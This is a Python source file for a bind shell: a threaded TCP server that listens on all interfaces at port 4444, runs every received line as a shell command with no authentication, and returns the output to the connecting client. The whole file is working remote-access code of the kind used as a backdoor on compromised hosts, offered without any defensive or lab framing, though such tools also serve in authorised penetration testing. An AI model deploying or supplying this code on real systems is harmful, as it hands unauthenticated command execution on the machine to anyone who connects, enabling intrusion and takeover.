"""Core bind shell implementation."""

from __future__ import annotations

import logging
import socket
import subprocess
from threading import Thread
from typing import Optional

DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 4444
DEFAULT_MAX_CONNECTIONS = 4
DEFAULT_COMMAND_TIMEOUT = 30
DEFAULT_CLIENT_TIMEOUT = 300
BUFFER_SIZE = 2048
LOGGER = logging.getLogger(__name__)


class BindShellError(Exception):
    """Raised for bind shell configuration or runtime errors."""


class BindShell:
    """A simple bind shell server that accepts commands over TCP."""

    def __init__(
        self,
        host: str = DEFAULT_HOST,
        port: int = DEFAULT_PORT,
        max_connections: int = DEFAULT_MAX_CONNECTIONS,
        command_timeout: int = DEFAULT_COMMAND_TIMEOUT,
        client_timeout: int = DEFAULT_CLIENT_TIMEOUT,
    ) -> None:
        self.host = host
        self.port = port
        self.max_connections = max_connections
        self.command_timeout = command_timeout
        self.client_timeout = client_timeout
        self.server_socket: Optional[socket.socket] = None
        self._running = False
        self._validate_config()

    def _validate_config(self) -> None:
        if not isinstance(self.host, str) or not self.host:
            raise BindShellError("Host must be a non-empty string.")
        if not isinstance(self.port, int) or not (1 <= self.port <= 65535):
            raise BindShellError("Port must be an integer between 1 and 65535.")
        if not isinstance(self.max_connections, int) or not (
            1 <= self.max_connections <= 100
        ):
            raise BindShellError(
                "Max connections must be an integer between 1 and 100."
            )
        if not isinstance(self.command_timeout, int) or self.command_timeout <= 0:
            raise BindShellError("Command timeout must be a positive integer.")
        if not isinstance(self.client_timeout, int) or self.client_timeout <= 0:
            raise BindShellError("Client timeout must be a positive integer.")

    def run_command(self, cmd: str) -> bytes:
        """Execute a shell command and return output."""
        try:
            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=True,
                timeout=self.command_timeout,
            )
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return b"Error: command timed out\n"
        except Exception as exc:  # pragma: no cover - safety net
            return f"Error: {exc}\n".encode("utf-8", errors="replace")

    def _recv_line(
        self, client_socket: socket.socket, buffer: bytearray
    ) -> tuple[Optional[bytes], bytearray]:
        while True:
            newline_idx = buffer.find(b"\n")
            if newline_idx != -1:
                line = bytes(buffer[:newline_idx])
                remainder = buffer[newline_idx + 1 :]
                return line, bytearray(remainder)
            chunk = client_socket.recv(BUFFER_SIZE)
            if not chunk:
                return None, buffer
            buffer.extend(chunk)

    def handle_client(self, client_socket: socket.socket) -> None:
        """Handle incoming client connection."""
        client_socket.settimeout(self.client_timeout)
        buffer = bytearray()
        try:
            while True:
                line, buffer = self._recv_line(client_socket, buffer)
                if line is None:
                    break
                cmd = line.rstrip(b"\r").decode("utf-8", errors="replace").strip()
                if not cmd:
                    continue
                if cmd.lower() == "exit":
                    break
                output = self.run_command(cmd)
                if output:
                    client_socket.sendall(output)
        except socket.timeout:
            LOGGER.info("Client connection timed out.")
        except Exception:
            LOGGER.exception("Unhandled client error.")
        finally:
            client_socket.close()

    def start(self) -> None:
        """Start the bind shell server."""
        self._running = True
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(self.max_connections)
        except OSError as exc:
            self._running = False
            raise BindShellError(f"Failed to start server: {exc}") from exc

        LOGGER.info("Bind shell listening on %s:%s", self.host, self.port)

        try:
            while self._running:
                try:
                    client_socket, address = self.server_socket.accept()
                except OSError:
                    if not self._running:
                        break
                    raise
                LOGGER.info("Connection from %s", address)
                thread = Thread(target=self.handle_client, args=(client_socket,))
                thread.daemon = True
                thread.start()
        except KeyboardInterrupt:
            LOGGER.info("Shutting down...")
        finally:
            self.stop()

    def stop(self) -> None:
        """Stop the bind shell server."""
        self._running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            finally:
                self.server_socket = None
